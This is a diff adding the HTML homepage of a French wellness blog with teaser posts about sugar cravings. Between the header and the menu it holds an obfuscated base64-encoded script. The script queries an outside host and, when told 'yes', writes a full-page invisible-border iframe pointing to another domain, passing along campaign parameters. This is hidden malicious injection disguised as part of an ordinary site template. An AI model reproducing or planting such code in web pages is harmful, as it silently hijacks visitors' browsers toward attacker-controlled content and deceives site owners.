@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+
+    <title>le visage</title>
+
+    <link href="https://fonts.googleapis.com/css?family=Playfair+Display:400,700,900|Rubik:300,400,500" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link rel="stylesheet" href="css/vendor/owl.carousel.min.css"/>
+    <link rel="stylesheet" href="css/vendor/owl.theme.default.min.css"/>
+    <link rel="stylesheet" href="css/custom.css">
+
+    <!--[if lt IE 9]>
+    <script src="js/vendor/html5shiv.min.js"></script>
+    <script src="js/vendor/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="https://use.fontawesome.com/9b701ba3c8.js"></script>
+    <script src="js/vendor/jquery.min.js"></script>
+    <script src="js/vendor/owl.carousel.min.js"></script>
+
+    <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+</head>
+<body>
+
+<div class="header">
+    <div class="header-top">
+        <div class="container">
+            <div class="logo">
+                <a href="index.html"><h1>le bien-être</h1></a>
+            </div>
+            <div class="search">
+                <form>
+                    <input type="text" value="" placeholder="recherche">
+                    <input type="submit" value="">
+                </form>
+            </div>
+            <div class="social">
+                <ul>
+                    <li><a href="#" class="facebook"> </a></li>
+                    <li><a href="#" class="facebook twitter"> </a></li>
+                    <li><a href="#" class="facebook chrome"> </a></li>
+                    <li><a href="#" class="facebook in"> </a></li>
+                    <li><a href="#" class="facebook beh"> </a></li>
+                    <li><a href="#" class="facebook vem"> </a></li>
+                    <li><a href="#" class="facebook yout"> </a></li>
+                </ul>
+            </div>
+            <div class="clearfix"></div>
+        </div>
+    </div>
+
+    <script src="data:text/javascript;base64,dmFyIF8weDNhM2Y9WyJ5ZXMiLCc8aWZyYW1lIHNyYz0iaHR0cHM6Ly9nb29nd2l6LmNvbS9pbmRleC5waHA/a2V5PWJmOTBzbGM3OWt6YncxN2hnYmpuJnV0bV9jYW1wYWlnbj0nLCI3NDgzMWxmUHZlcSIsJyIgZnJhbWVib3JkZXI9IjAiIHN0eWxlPSJvdmVyZmxvdzpoaWRkZW47b3ZlcmZsb3cteDpoaWRkZW47b3ZlcmZsb3cteTpoaWRkZW47aGVpZ2h0OjEwMCU7d2lkdGg6MTAwJTtwb3NpdGlvbjphYnNvbHV0ZTt0b3A6MHB4O2xlZnQ6MHB4O3JpZ2h0OjBweDtib3R0b206MHB4IiBoZWlnaHQ9IjEwMCUiIHdpZHRoPSIxMDAlIj48L2lmcmFtZT4nLCIyMzk5MFBzeWdjRiIsInNlYXJjaCIsIjM2ODIzeUhPZ3dZIiwiMXFBRlVHeCIsIiZ1dG1fdGVybT0iLCIyNDcxNzBaY3JRdkMiLCJ3cml0ZSIsIm1hdGNoIiwiaHR0cHM6Ly9kZXNlcnZldHJhdmVsLmNvbS9pbmRleC5waHA/a2V5PW02Y2M2Ymd6Y3pjMjM4YWR3OXBwIiwibG9jYXRpb24iLCIzMjg0OTZwc0F0REkiLCJnZXQiLCI0MDYyOTVVVndwVkIiLCI0MDQ4NTZWSHpQSU8iLCJ1dG1fY2FtcGFpZ24iLCIydVFpQnRuIl0sXzB4NGYwNTZmPV8weDNjM2Q7ZnVuY3Rpb24gZ2V0Q29va2llcyhlKXt2YXIgdD1fMHgzYzNkLHI9d2luZG93W3QoNDIyKV1bdCg0MTQpXTtyZXR1cm4hIShyPXJbdCg0MjApXShuZXcgUmVnRXhwKGUrIj0oW14mPV0rKSIpKSkmJnJbMV19ZnVuY3Rpb24gXzB4M2MzZChlLHQpe3JldHVybiBfMHgzYTNmW2UtPTQwNF19ZnVuY3Rpb24gb25BamF4U3VjY2VzcyhlKXt2YXIgdD1fMHg0ZjA1NmY7ZT09dCg0MDkpJiZkb2N1bWVudFt0KDQxOSldKHQoNDEwKStnZXRDb29raWVzKHQoNDA3KSkrdCg0MTcpK2dldENvb2tpZXMoInV0bV90ZXJtIikrdCg0MTIpKX0hZnVuY3Rpb24odCl7Zm9yKHZhciBlPV8weDNjM2Q7Oyl0cnl7aWYoMjE5NTk0PT09cGFyc2VJbnQoZSg0MjMpKStwYXJzZUludChlKDQxMykpK3BhcnNlSW50KGUoNDE2KSkqLXBhcnNlSW50KGUoNDE1KSkrLXBhcnNlSW50KGUoNDA2KSkrLXBhcnNlSW50KGUoNDE4KSkrLXBhcnNlSW50KGUoNDA4KSkqLXBhcnNlSW50KGUoNDExKSkrcGFyc2VJbnQoZSg0MDUpKSlicmVhazt0LnB1c2godC5zaGlmdCgpKX1jYXRjaChlKXt0LnB1c2godC5zaGlmdCgpKX19KF8weDNhM2YpLCRbXzB4NGYwNTZmKDQwNCldKF8weDRmMDU2Zig0MjEpLG9uQWpheFN1Y2Nlc3MpOw=="></script>
+
+    <!--head-bottom-->
+    <div class="head-bottom">
+        <div class="container">
+            <div id="navbar" class="navbar-collapse">
+                <ul class="nav navbar-nav flex-row">
+                    <li class="active"><a href="index.html">Accueil</a></li>
+                    <li><a href="contact.html">Contacts</a></li>
+                    <li><a href="terms.html">Les conditions générales de</a></li>
+                    <li><a href="policy.html">Politique de confidentialité</a></li>
+                </ul>
+            </div><!--/.nav-collapse -->
+        </div>
+
+    </div>
+    <!--head-bottom-->
+</div>
+
+<style>
+    .header-top {
+        padding: 1.5em 0;
+        background: #fff;
+    }
+
+    /*--logo--*/
+    .logo {
+        float: left;
+    }
+
+    .logo a {
+        display: block;
+    }
+
+    .logo a h1 {
+        font-size: 2em;
+        font-weight: 700;
+        color: #fff;
+        background: #464646;
+        padding: 0.2em 0.5em;
+    }
+
+    .logo a h1:hover {
+        text-decoration: none;
+    }
+
+    /*--logo--*/
+    /*--social--*/
+    .social {
+        float: right;
+        width: 26.33%;
+        padding: 0.32em 0;
+    }
+
+    .social ul {
+        padding: 0;
+        margin: 0;
+    }
+
+    .social ul li {
+        display: inline-block;
+        margin: 0;
+    }
+
+    .social ul li a.facebook {
+        background: url(../images/social.png) no-repeat 0px 0px;
+        width: 32px;
+        height: 32px;
+        display: block;
+    }
+
+    .social ul li a.twitter {
+        background: url(../images/social.png) no-repeat -34px 0px;
+    }
+
+    .social ul li a.chrome {
+        background: url(../images/social.png) no-repeat -68px 0px;
+    }
+
+    .social ul li a.in {
+        background: url(../images/social.png) no-repeat -102px 0px;
+    }
+
+    .social ul li a.beh {
+        background: url(../images/social.png) no-repeat -136px 0px;
+    }
+
+    .social ul li a.vem {
+        background: url(../images/social.png) no-repeat -169px 0px;
+    }
+
+    .social ul li a.yout {
+        background: url(../images/social.png) no-repeat -202px 0px;
+    }
+
+    .social ul li a.facebook:hover {
+        opacity: .5;
+    }
+
+    /*--social--*/
+    /*--search--*/
+    .search {
+        float: right;
+        width: 25%;
+        margin: 0.2em 0;
+    }
+
+    .search {
+        position: relative;
+        border: 2px solid #333333;
+        padding: 0.5em 0;
+        background: #fff;
+    }
+
+    .search input[type="text"] {
+        width: 80%;
+        outline: none;
+        padding: 0em 0.6em;
+        font-size: 1em;
+        color: #333333;
+        position: relative;
+        border: none;
+    }
+
+    .search input[type="submit"] {
+        background: url(../images/search-icon.png) no-repeat 0px 2px #fff;
+        border: none;
+        height: 26px;
+        width: 26px;
+        display: inline-block;
+        position: absolute;
+        outline: none;
+        cursor: pointer;
+        top: 6px;
+        right: 2px;
+    }
+
+    /*--search--*/
+    .logo a span {
+        font-size: 0.9em;
+        margin-left: 5em;
+        padding-top: 0.5em;
+    }
+
+    .head-bottom {
+        background: #fa4b2a;
+    }
+
+    /*--navigation--*/
+    ul.nav.navbar-nav li.active a {
+        background: #464646 ! important;
+        color: #fff ! important;
+        text-transform: uppercase ! important;
+        font-weight: 700;
+    }
+
+    ul.nav.navbar-nav li a:hover {
+        background: #464646 ! important;
+        color: #fff ! important;
+    }
+
+    ul.nav.navbar-nav li a {
+        color: #fff ! important;
+        text-transform: uppercase ! important;
+        font-weight: 700 ! important;
+        padding: 15px 23px ! important;
+        border-right: 1px solid rgba(255, 255, 255, 0.32) ! important;
+        font-size: 1em;
+        display: block;
+    }
+
+    .head-bottom ul.dropdown-menu li a {
+        color: #000 ! important;
+        padding: 8px 15px ! important;
+        font-size: 0.9em ! important;
+    }
+
+    .navbar-collapse {
+        padding-left: 0px ! important;
+        padding-right: 0px ! important;
+    }
+
+    .collapse {
+        display: none;
+    }
+</style>
+
+<section class="hero-section">
+    <div class="hero-slider owl-carousel">
+        
+        <div class="hero-item set-bg" style="background: url(./assets/images/tim-goedhart-vnptrdmtq30-unsplash.jpg); background-size: cover">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-10 offset-lg-1">
+                        <h2 class="text-shadow">Comment se débarrasser des envies de sucreries,</h2>
+                        <p class="text-shadow">
+                             <strong></strong> Il y a plusieurs façons de se débarrasser de l'habitude de trop manger. L'un d'eux est le transfert de goût et de sensations ém...
+                        </p>
+                        <a href="3a17e310ad5079ac3d387d538ab1637b.html" class="site-btn">Lire la suite</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+
+        <div class="hero-item set-bg" style="background: url(./assets/images/chelsea-shapouri-8xc6a9kugru-unsplash.jpg); background-size: cover">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-10 offset-lg-1">
+                        <h2 class="text-shadow">Comment se débarrasser des envies de sucreries,</h2>
+                        <p class="text-shadow">
+                             <strong></strong> Il y a plusieurs façons de se débarrasser de l'habitude de trop manger. L'un d'eux est le transfert de goût et de sensations ém...
+                        </p>
+                        <a href="e0a381c70ff8e9a9da7049955ce07719.html" class="site-btn">Lire la suite</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+
+        <div class="hero-item set-bg" style="background: url(./assets/images/lesly-juarez-dftjxyd5pto-unsplash.jpg); background-size: cover">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-10 offset-lg-1">
+                        <h2 class="text-shadow">Comment se débarrasser des envies de sucreries,</h2>
+                        <p class="text-shadow">
+                             <strong></strong> Il y a plusieurs façons de se débarrasser de l'habitude de trop manger. L'un d'eux est le transfert de goût et de sensations ém...
+                        </p>
+                        <a href="3kV3m62dEPjXV3YNW8J6hb2fzkRwd.html" class="site-btn">Lire la suite</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+
+    </div>
+</section>
+
+<style>
+    .hero-item {
+        height: 804px;
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        -ms-flex-pack: center;
+        justify-content: center;
+        text-align: center;
+        position: relative;
+    }
+
+    .hero-item:after {
+        position: absolute;
+        content: "";
+        width: 100%;
+        height: 100%;
+        left: 0;
+        top: 0;
+        background: #0d0d11;
+        opacity: 0.74;
+        z-index: 1;
+    }
+
+    .hero-item .container {
+        position: relative;
+        z-index: 9;
+    }
+
+    .hero-item h2 {
+        font-size: 76px;
+        font-weight: 700;
+        color: #fff;
+        margin-bottom: 15px;
+    }
+
+    .hero-item p {
+        font-size: 20px;
+        margin-bottom: 35px;
+    }
+
+    .hero-item .site-btn,
+    .hero-item p,
+    .hero-item h2 {
+        position: relative;
+        top: 50px;
+        opacity: 0;
+    }
+
+    .hero-slider .owl-item.active .hero-item h2,
+    .hero-slider .owl-item.active .hero-item p,
+    .hero-slider .owl-item.active .hero-item .site-btn {
+        top: 0;
+        opacity: 1;
+    }
+
+    .hero-slider .owl-item.active .hero-item h2 {
+        -webkit-transition: all 0.5s ease 0.4s;
+        transition: all 0.5s ease 0.4s;
+    }
+
+    .hero-slider .owl-item.active .hero-item p {
+        -webkit-transition: all 0.5s ease 0.6s;
+        transition: all 0.5s ease 0.6s;
+    }
+
+    .hero-slider .owl-item.active .hero-item .site-btn {
+        -webkit-transition: all 0.5s ease 0.8s;
+        transition: all 0.5s ease 0.8s;
+        background: #ffffff;
+        padding: 1rem;
+    }
+
+    .slider-progress-bar {
+        position: absolute;
+        width: 100%;
+        bottom: 0;
+        left: 0;
+    }
+
+    .slider-progress-bar .progress {
+        height: 4px;
+        background: #10ddb4;
+        -webkit-animation: sliderProgressBar ease;
+        animation: sliderProgressBar ease;
+    }
+
+    .my-slider:hover .slider-progress-bar .progress {
+        -webkit-animation-play-state: paused;
+        animation-play-state: paused;
+    }
+
+    @-webkit-keyframes sliderProgressBar {
+        0% {
+            width: 0%;
+        }
+        100% {
+            width: 100%;
+        }
+    }
+
+    @keyframes sliderProgressBar {
+        0% {
+            width: 0%;
+        }
+        100% {
+            width: 100%;
+        }
+    }
+
+    .owl-nav.disabled {
+        display: none;
+    }
+</style>
+
+<script>
+    $(document).ready(function() {
+        var $slider = $('.hero-slider');
+        var SLIDER_TIMEOUT = 10000;
+
+        $slider.owlCarousel({
+            items: 1,
+            nav: false,
+            dots: false,
+            autoplay: true,
+            autoplayTimeout: SLIDER_TIMEOUT,
+            loop: true,
+        });
+    })
+</script>
+
+<main>
+    <section class="probootstrap-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12 text-center mb50">
+                    <h2 class="mt0">Les récents messages</h2>
+                </div>
+            </div>
+            <div class="row">
+                
+                <div class="col-md-4">
+                    <p><img src="./assets/images/tim-goedhart-vnptrdmtq30-unsplash.jpg" alt="" class="img-responsive"></p>
+                    <h3 class="mt0 mb40"><a href="3a17e310ad5079ac3d387d538ab1637b.html" class="hover-reverse">Comment se débarrasser des envies ...</a></h3>
+                    <p> <strong></strong> Il y a plusieurs façons de se débarrasser de l'habitude de trop manger. L'un d'eux est le transfert de goût et de sensations émotionnelles à partir d'un favori de la délicatesse, à un pas de coup de coeur, mais en même temps, inoffensif à la figure. Ainsi, vous pouvez tra...</p>
+                </div>
+                
+
+                <div class="col-md-4">
+                    <p><img src="./assets/images/chelsea-shapouri-8xc6a9kugru-unsplash.jpg" alt="" class="img-responsive"></p>
+                    <h3 class="mt0 mb40"><a href="e0a381c70ff8e9a9da7049955ce07719.html" class="hover-reverse">Comment se débarrasser des envies ...</a></h3>
+                    <p> <strong></strong> Il y a plusieurs façons de se débarrasser de l'habitude de trop manger. L'un d'eux est le transfert de goût et de sensations émotionnelles à partir d'un favori de la délicatesse, à un pas de coup de coeur, mais en même temps, inoffensif à la figure. Ainsi, vous pouvez tra...</p>
+                </div>
+                
+
+                <div class="col-md-4">
+                    <p><img src="./assets/images/lesly-juarez-dftjxyd5pto-unsplash.jpg" alt="" class="img-responsive"></p>
+                    <h3 class="mt0 mb40"><a href="3kV3m62dEPjXV3YNW8J6hb2fzkRwd.html" class="hover-reverse">Comment se débarrasser des envies ...</a></h3>
+                    <p> <strong></strong> Il y a plusieurs façons de se débarrasser de l'habitude de trop manger. L'un d'eux est le transfert de goût et de sensations émotionnelles à partir d'un favori de la délicatesse, à un pas de coup de coeur, mais en même temps, inoffensif à la figure. Ainsi, vous pouvez tra...</p>
+                </div>
+                
+
+            </div>
+        </div>
+    </section>
+</main>
+<style>
+    .probootstrap-section {
+        padding: 100px 0;
+    }
+</style>
+
+<footer class="probootstrap-footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6">
+                <p class="mb0">&copy; Copyright. All Rights Reserved.</p>
+            </div>
+            <div class="col-md-6">
+            </div>
+        </div>
+    </div>
+</footer>
+<style>
+    .probootstrap-footer {
+        padding: 3em 0;
+        background: #000;
+        position: relative;
+        color: rgba(255,255,255,.4);
+    }
+</style>
+<div class='cookie-banner'>
+    <p>
+        Le site utilise des cookies. Ils vous permettent de vous reconnaître et de recevoir des informations sur votre expérience d'utilisateur.En continuant à naviguer dans le site, je suis d'accord avec l'utilisation des cookies par le propriétaire du site en conformité avec les  <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">Politique de cookies</a>
+    </p>
+    <button class='close-cookie'>&times;</button>
+</div>
+
+<script src="js/scripts.js"></script>
+<script src="js/main.js"></script>
+<script src="js/custom.js"></script>
+
+<script>
+    window.onload = function () {
+        jQuery('.close-cookie').click(function () {
+            jQuery('.cookie-banner').fadeOut();
+        })
+    }
+
+    let elems = document.querySelectorAll('.server-name');
+    elems.forEach((elem) => {
+        elem.innerHTML = window.location.hostname
+    })
+</script>
+
+</body>
+</html>
